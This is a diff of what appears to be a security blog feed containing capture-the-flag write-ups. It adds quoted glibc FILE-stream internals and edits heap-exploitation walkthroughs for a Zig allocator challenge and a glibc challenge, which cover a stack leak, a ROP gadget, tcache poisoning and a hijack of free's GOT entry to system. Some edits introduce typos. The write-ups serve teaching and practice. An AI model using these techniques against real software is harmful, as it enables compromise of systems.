+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
+<span class="p">};</span>
+
+<span class="c1">// vanilla vtable
+</span><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1432
+</span><span class="c1"></span><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_file_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
+<span class="p">{</span>
+  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_file_finish</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_file_xsputn</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_new_file_seekoff</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_new_file_setbuf</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_new_file_sync</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_file_doallocate</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
+  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
+<span class="p">};</span>
+<span class="n">libc_hidden_data_def</span> <span class="p">(</span><span class="n">_IO_file_jumps</span><span class="p">)</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
+    <h2 id="_io_file_xsgetn_mmap">
+        _IO_file_xsgetn_mmap
+        <a data-clipboard-text="https://nasm.re/posts/filestream/#_io_file_xsgetn_mmap" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor _IO_file_xsgetn_mmap" href="#_io_file_xsgetn_mmap">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Let&rsquo;s first take a look at <code>_IO_file_xsgetn_mmap</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1364
+</span><span class="c1"></span>
+<span class="k">static</span> <span class="n">size_t</span>
+<span class="nf">_IO_file_xsgetn_mmap</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">n</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">size_t</span> <span class="n">have</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
+
+  <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">)))</span>
+	<span class="p">{</span>
+	  <span class="n">s</span> <span class="o">=</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">read_ptr</span><span class="p">,</span> <span class="n">have</span><span class="p">);</span>
+	  <span class="n">n</span> <span class="o">-=</span> <span class="n">have</span><span class="p">;</span>
+	  <span class="n">_IO_switch_to_main_get_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+	  <span class="n">read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+	  <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+	<span class="p">}</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">)</span>
+	<span class="p">{</span>
+	  <span class="cm">/* Check that we are mapping all of the file, in case it grew.  */</span>
+	  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">mmap_remap_check</span> <span class="p">(</span><span class="n">fp</span><span class="p">)))</span>
+	    <span class="cm">/* We punted mmap, so complete with the vanilla code.  */</span>
+	    <span class="k">return</span> <span class="n">s</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span> <span class="o">+</span> <span class="n">_IO_XSGETN</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+
+	  <span class="n">read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+	  <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">read_ptr</span><span class="p">;</span>
+	<span class="p">}</span>
+    <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">)</span>
+    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">have</span> <span class="o">=</span> <span class="n">MIN</span> <span class="p">(</span><span class="n">have</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+      <span class="n">s</span> <span class="o">=</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">read_ptr</span><span class="p">,</span> <span class="n">have</span><span class="p">);</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">read_ptr</span> <span class="o">+</span> <span class="n">have</span><span class="p">;</span>
+    <span class="p">}</span>
+
+  <span class="k">return</span> <span class="n">s</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/fileops.c#L541
+</span><span class="c1"></span>
+<span class="cm">/* Guts of underflow callback if we mmap the file.  This stats the file and
+</span><span class="cm">   updates the stream state to match.  In the normal case we return zero.
+</span><span class="cm">   If the file is no longer eligible for mmap, its jump tables are reset to
+</span><span class="cm">   the vanilla ones and we return nonzero.  */</span>
+<span class="k">static</span> <span class="kt">int</span>
+<span class="nf">mmap_remap_check</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">stat64</span> <span class="n">st</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_SYSSTAT</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
+      <span class="o">&amp;&amp;</span> <span class="n">S_ISREG</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_mode</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span> <span class="o">!=</span> <span class="mi">0</span>
+      <span class="cm">/* Limit the file size to 1MB for 32-bit machines.  */</span>
+      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">ptrdiff_t</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="k">const</span> <span class="n">size_t</span> <span class="n">pagesize</span> <span class="o">=</span> <span class="n">__getpagesize</span> <span class="p">();</span>
+<span class="cp"># define ROUNDED(x)	(((x) + pagesize - 1) &amp; ~(pagesize - 1))
+</span><span class="cp"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span>
+					  <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">))</span>
+	<span class="p">{</span>
+	  <span class="cm">/* We can trim off some pages past the end of the file.  */</span>
+	  <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">),</span>
+			   <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
+			   <span class="o">-</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">));</span>
+	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
+	<span class="p">}</span>
+      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span>
+					       <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">))</span>
+	<span class="p">{</span>
+	  <span class="cm">/* The file added some pages.  We need to remap it.  */</span>
+	  <span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+<span class="cp">#if _G_HAVE_MREMAP
+</span><span class="cp"></span>	  <span class="n">p</span> <span class="o">=</span> <span class="n">__mremap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">ROUNDED</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span>
+						   <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">),</span>
+			<span class="n">ROUNDED</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">),</span> <span class="n">MREMAP_MAYMOVE</span><span class="p">);</span>
+	  <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
+	    <span class="p">{</span>
+	      <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
+			       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
+	      <span class="k">goto</span> <span class="n">punt</span><span class="p">;</span>
+	    <span class="p">}</span>
+<span class="cp">#else
+</span><span class="cp"></span>	  <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
+			   <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
+	  <span class="n">p</span> <span class="o">=</span> <span class="n">__mmap64</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span>
+			<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	  <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
+	    <span class="k">goto</span> <span class="n">punt</span><span class="p">;</span>
+<span class="cp">#endif
+</span><span class="cp"></span>	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
+	<span class="p">}</span>
+      <span class="k">else</span>
+	<span class="p">{</span>
+	  <span class="cm">/* The number of pages didn&#39;t change.  */</span>
+	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="cp"># undef ROUNDED
+</span><span class="cp"></span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">-=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+      <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
+		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
+		<span class="o">?</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="nl">_offset</span> <span class="p">:</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">,</span>
+		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">);</span>
+
+      <span class="cm">/* If we are already positioned at or past the end of the file, don&#39;t
+</span><span class="cm">	 change the current offset.  If not, seek past what we have mapped,
+</span><span class="cm">	 mimicking the position left by a normal underflow reading into its
+</span><span class="cm">	 buffer until EOF.  */</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
+	<span class="p">{</span>
+	  <span class="k">if</span> <span class="p">(</span><span class="n">__lseek64</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
+			 <span class="n">SEEK_SET</span><span class="p">)</span>
+	      <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
+	    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
+	  <span class="k">else</span>
+	    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+	<span class="p">}</span>
+
+      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="cm">/* Life is no longer good for mmap.  Punt it.  */</span>
+      <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
+		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
+    <span class="nl">punt</span><span class="p">:</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+      <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps</span><span class="p">;</span>
+      <span class="k">else</span>
+	<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps</span><span class="p">;</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps</span><span class="p">;</span>
+
+      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>First is computed the amount of bytes that contains the read buffer (<code>have</code>). If we do not have the right amount of bytes within the read buffer we first try to copy data from the read buffer. Then we check we are mappng the whole file (and not only a part of it) with the use of <code>mmap_remap_check</code> (to avoid useless code I put it directly after the implementation of <code>_IO_file_xsgetn_mmap</code>), if it fails the file is unmapped and the vanilla file operations is used to read data from the file.</p>
 ]]></content>
             
                  
@@ -798,7 +1239,7 @@
   href="https://github.com/ziglang/zig/"
   
   >zig</a
-> source code is quite readable so let&rsquo;s take a look at the internals of the GeneralPurposeAllocator allocator.
+> source is quite readable so let&rsquo;s take a look at the internals of the GeneralPurposeAllocator allocator.
 The GeneralPurposeAllocator is implemented <a
   class="gblog-markdown__link"
   href="https://github.com/ziglang/zig/blob/master/lib/std/heap/general_purpose_allocator.zig"
@@ -931,7 +1372,7 @@ The header of the source code file gives the basic design of the allocator:</p>
 </span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bucket</span><span class="p">.</span><span class="n">page</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">slot_index</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">size_class</span><span class="p">;</span><span class="w">
 </span><span class="w"></span><span class="p">}</span><span class="w">
 </span></code></pre></div><p><code>allocSlot</code> will check if the current bucket is able to allocate one more object, else it will iterate through the doubly linked list to look for a not full bucket.
-And if it does not find one, it creates a new bucket. When the bucket is allocated, it returns the available objet at <code>bucket.page + slot_index * size_class</code>.</p>
+And if it does nto find one, it creates a new bucket. When the bucket is allocated, it returns the available objet at <code>bucket.page + slot_index * size_class</code>.</p>
 <p>As you can see, the <code>BucketHeader</code> is structured like below in the <code>createBucket</code> function:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="k">fn</span> <span class="nf">createBucket</span><span class="p">(</span><span class="bp">self</span>: <span class="o">*</span><span class="bp">Self</span><span class="p">,</span><span class="w"> </span><span class="n">size_class</span>: <span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">bucket_index</span>: <span class="kt">usize</span><span class="p">)</span><span class="w"> </span><span class="n">Error</span><span class="o">!*</span><span class="n">BucketHeader</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">.</span><span class="n">allocAdvanced</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">page_size</span><span class="p">,</span><span class="w"> </span><span class="n">page_size</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">exact</span><span class="p">);</span><span class="w">
@@ -956,7 +1397,7 @@ And if it does not find one, it creates a new bucket. When the bucket is allocat
 <p>Let&rsquo;s quickly decribe each field of the <code>BucketHeader</code>:</p>
 <ul>
 <li><code>.prev</code> and <code>.next</code> keep track of the doubly linked list that links buckets of same size.</li>
-<li><code>.page</code> contains the base address of the page that contains the objects that belongs to the bucket.</li>
+<li><code>.page</code> contains the base address of the page that contains the objects that belong to the bucket.</li>
 <li><code>alloc_cursor</code> contains the number of allocated objects.</li>
 <li><code>used_count</code> contains the number of currently used objects.</li>
 </ul>
@@ -999,7 +1440,7 @@ This way the next allocation that will request <code>0x400</code> bytes, which w
         </a>
     </h2>
 </div>
-<p>To leak the stack I leaked the <code>argv</code> variable that contains a pointer toward arguments given to the program, stored on the stack. That&rsquo;s a reliable leak given it&rsquo;s a known and fixed location, which can be used as a base compared with function&rsquo;s stackframes.</p>
+<p>To leak the stack I leaked the <code>argv</code> variable that contains a pointer toward arguments given to the program, stored on the stack. That&rsquo;s a reliable leak given it&rsquo;s a known and fixed location, which can base used as a base compared with function&rsquo;s stackframes.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span> <span class="c1"># get chunk into target location (0x208000)</span>
 <span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
 <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># argv is located at 0x208000 + 0x100</span>
@@ -1014,7 +1455,7 @@ This way the next allocation that will request <code>0x400</code> bytes, which w
         </a>
     </h2>
 </div>
-<p>Now we&rsquo;re able to overwrite whatever function&rsquo;s stackframe, we have to find one that returns from context of <code>std.fs.file.File.read</code> that reads the user input to the chunk. But unlucky functions like <code>add</code>, <code>edit</code> are inlined in the <code>main</code> function. Moreover we cannot overwrite the return address of the <code>main</code> function given that the exit handler calls directly exit. Which means we have to corrupt the stackframe of the <code>std.fs.file.File.read</code> function called in the <code>edit</code> function.
+<p>Now we&rsquo;re able to overwrite whatever function&rsquo;s stackframe, we have to find one that returns from context of <code>std.fs.file.File.read</code> that reads the user input to the chunk. But unlucky functions like <code>add</code>, <code>edit</code> are inlined in the <code>main</code> function. Moreover we cannot overwrite the return address of the <code>main</code> function given that the exit handler call directly exit. Which means we have to corrput the stackframe of the <code>std.fs.file.File.read</code> function called in the <code>edit</code> function.
 But the issue is that between the call to <code>SYS_read</code> within <code>std.fs.file.File.read</code> and the end of the function, variables that belong to the calling function&rsquo;s stackframe are edited, corrupting the ROPchain. So what I did is using this gadget to reach a part of the stack that will not be corrupted:</p>
 <pre tabindex="0"><code>0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
 </code></pre><p>With the use of this gadget I&rsquo;m able to pop a few QWORD from the stack to reach another area of the stack where I write my ROPchain.
@@ -1304,7 +1745,7 @@ If you begin with heap challenges, I advice you to read <a
     </h2>
 </div>
 <ul>
-<li>Fill the tcache.</li>
+<li>Fill tcache.</li>
 <li>Heap overflow in <code>edit</code> on the <code>bio</code> field which allows to leak the address of the unsortedbin.</li>
 <li>Leak heap and defeat safe-linking to get an arbitrary write through tcache poisoning.</li>
 <li>Hiijack GOT entry of <code>free</code> to <code>system</code>.</li>
@@ -1419,7 +1860,7 @@ Then the <code>delete</code> function:</p>
   <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div><p>Quite common <code>delete</code> handler, it prevents double free.
-The vulnerability lies into the <code>edit</code> function:</p>
+The vulnerability is in the <code>edit</code> function:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">edit</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+7h] [rbp-9h] BYREF
@@ -1453,14 +1894,14 @@ The vulnerability lies into the <code>edit</code> function:</p>
         </a>
     </h2>
 </div>
-<p>There is no actual issue, we can allocate whatever chunk bigger than <code>0x407</code>, the only fancy thing we have to do would be to defeat safe-linking to get an arbitrary write through a tcache poisoning attack on the <code>0x410</code> tcache bin. Here is the attack I led against the challenge but that&rsquo;s not the most optimized.</p>
+<p>There is no actual issue, we can allocate whatever chunk bigger than <code>0x407</code>, the only fancy thing we have to do would be to defeat safe-linking to get an arbitrary write with a tcache poisoning attack on the <code>0x410</code> tcache bin. Here is the attack I led against the challenge but that&rsquo;s not the most optimized.</p>
